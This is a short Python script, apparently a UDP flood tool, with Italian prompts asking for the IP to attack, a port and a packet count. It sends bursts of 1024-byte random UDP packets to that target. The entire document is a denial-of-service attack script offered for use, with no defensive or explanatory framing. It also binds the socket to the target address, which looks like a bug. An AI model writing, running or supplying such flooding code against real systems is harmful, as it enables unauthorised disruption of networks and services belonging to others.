import socket
import random



target = input("Ip da Attaccare: ")
port = int(input("Porta: "))
numofpackets = int(input("Numero di Pacchetti da inviare: "))



while (0 < numofpackets):
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.bind((target, port))


	data = random.randbytes(1024)
	victim = (str(target), int(port))


	for i in range(numofpackets):
		s.sendto(data, victim)
		numofpackets -= 1


		print(f"Sent: {i}", end='\r')

	s.close()

